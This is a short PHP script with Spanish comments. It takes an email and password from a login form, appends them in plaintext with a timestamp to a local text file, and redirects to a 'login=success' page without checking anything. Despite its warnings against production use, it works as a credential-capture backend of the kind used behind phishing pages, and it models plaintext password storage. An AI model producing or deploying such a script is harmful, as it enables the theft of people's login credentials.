<?php
// ¡ADVERTENCIA! Esto no es seguro para producción.
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitizar datos
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = htmlspecialchars($_POST['password']);
    $timestamp = date("Y-m-d H:i:s");

    // Guardar en archivo (¡No usar en entornos reales!)
    $log = fopen("login_data.txt", "a");
    fwrite($log, "[$timestamp] Email: $email | Contraseña: $password\n");
    fclose($log);

    // Redirección
    header("Location: index.html?login=success");
    exit();
}
?>